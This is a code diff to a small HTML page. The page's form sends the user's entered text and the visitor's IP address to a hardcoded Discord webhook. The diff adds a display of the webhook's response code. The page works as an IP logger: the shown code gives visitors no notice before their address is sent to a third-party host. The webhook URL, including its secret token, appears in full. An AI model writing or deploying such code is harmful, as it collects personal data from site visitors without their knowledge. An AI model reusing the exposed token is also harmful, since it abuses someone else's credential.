@@ -10,9 +10,11 @@
     <input type="text" id="text" name="text"><br>
     <input type="submit" value="Submit">
   </form> 
+  <div id="response" class="response"></div>
   <script>
-    // Get the form element
+    // Get the form and response elements
     const form = document.getElementById('form');
+    const response = document.getElementById('response');
 
     // Handle form submission
     form.addEventListener('submit', (event) => {
@@ -30,7 +32,7 @@
           console.log(`IP address: ${ip}`);
 
           // Send the IP address and text to the Discord webhook
-          fetch('https://discord.com/api/webhooks/1053303789194588180/uOwiXrahinkCIEmIczYdnp_0UF6-wS1Ti4QEylihBB-yac4C2KeNUDK6h-XyQWC1Mv-S', {
+          return fetch('https://discord.com/api/webhooks/1053303789194588180/uOwiXrahinkCIEmIczYdnp_0UF6-wS1Ti4QEylihBB-yac4C2KeNUDK6h-XyQWC1Mv-S', {
             method: 'POST',
             headers: {
               'Content-Type': 'application/json'
@@ -39,9 +41,12 @@
               content: `Text: ${text}\nIP address: ${ip}`
             })
           });
+        })
+        .then((res) => {
+          // Display the response code
+          response.textContent = `Response code: ${res.status}`;
         });
     });
   </script>
 </body>
 </html>
-
